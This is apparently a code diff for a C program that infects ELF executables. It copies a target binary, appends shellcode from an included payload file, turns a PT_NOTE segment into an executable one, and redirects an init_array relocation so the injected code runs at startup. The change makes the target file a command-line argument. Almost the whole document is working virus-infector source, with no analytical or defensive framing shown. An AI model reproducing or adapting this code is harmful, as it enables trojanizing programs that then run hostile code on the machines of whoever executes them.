@@ -1,14 +1,13 @@
-#include <stdio.h>
-#include <unistd.h>
+#include <elf.h>
 #include <fcntl.h>
 #include <limits.h>
+#include <stdio.h>
+#include <stdlib.h>
 #include <sys/mman.h>
-#include <elf.h>
 #include <sys/stat.h>
+#include <unistd.h>
 
 #include "payload.c"
-
-char *target = "program";
 
 void copy_file(const char *from, const char *to)
 {
@@ -34,16 +33,21 @@ void copy_file(const char *from, const char *to)
 	close(to_fd);
 }
 
-int main(void)
+int main(int argc, char *argv[])
 {
+	if (argc != 2) {
+		printf("Usage: %s <elf_filename>\n", argv[0]);
+		exit(1);
+	}
+
 	char new_filename[PATH_MAX];
-	snprintf(new_filename, PATH_MAX, "%s_infected", target);
-	copy_file(target, new_filename);
+	snprintf(new_filename, PATH_MAX, "%s_infected", argv[1]);
+	copy_file(argv[1], new_filename);
 
 	int fd = open(new_filename, O_RDWR);
-	size_t fd_sz = lseek(fd, 0, SEEK_END);
-	lseek(fd, 0, SEEK_SET);
-	char *elf = mmap(NULL, fd_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	struct stat st;
+	fstat(fd, &st);
+	char *elf = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf;
 	Elf64_Shdr *shdr = (Elf64_Shdr *)(elf + ehdr->e_shoff);
@@ -89,7 +93,7 @@ int main(void)
 		}
 	}
 
-	*(unsigned int *)(shellcode + shellcode_len - 4) = init_array_rela->r_addend - (fd_sz + shellcode_len + 0xc000);
+	*(unsigned int *)(shellcode + shellcode_len - 4) = init_array_rela->r_addend - (st.st_size + shellcode_len + 0xc000);
 	lseek(fd, 0, SEEK_END);
 	write(fd, shellcode, shellcode_len);
 
@@ -97,12 +101,12 @@ int main(void)
 	note_phdr->p_flags = PF_R | PF_X;
 	note_phdr->p_filesz = shellcode_len;
 	note_phdr->p_memsz = shellcode_len;
-	note_phdr->p_vaddr = fd_sz + 0xc000;
-	note_phdr->p_paddr = fd_sz + 0xc000;
-	note_phdr->p_offset = fd_sz;
+	note_phdr->p_vaddr = st.st_size + 0xc000;
+	note_phdr->p_paddr = st.st_size + 0xc000;
+	note_phdr->p_offset = st.st_size;
 
-	init_array_rela->r_addend = fd_sz + 0xc000;
+	init_array_rela->r_addend = st.st_size + 0xc000;
 
-	munmap(elf, fd_sz);
+	munmap(elf, st.st_size);
 	close(fd);
 }
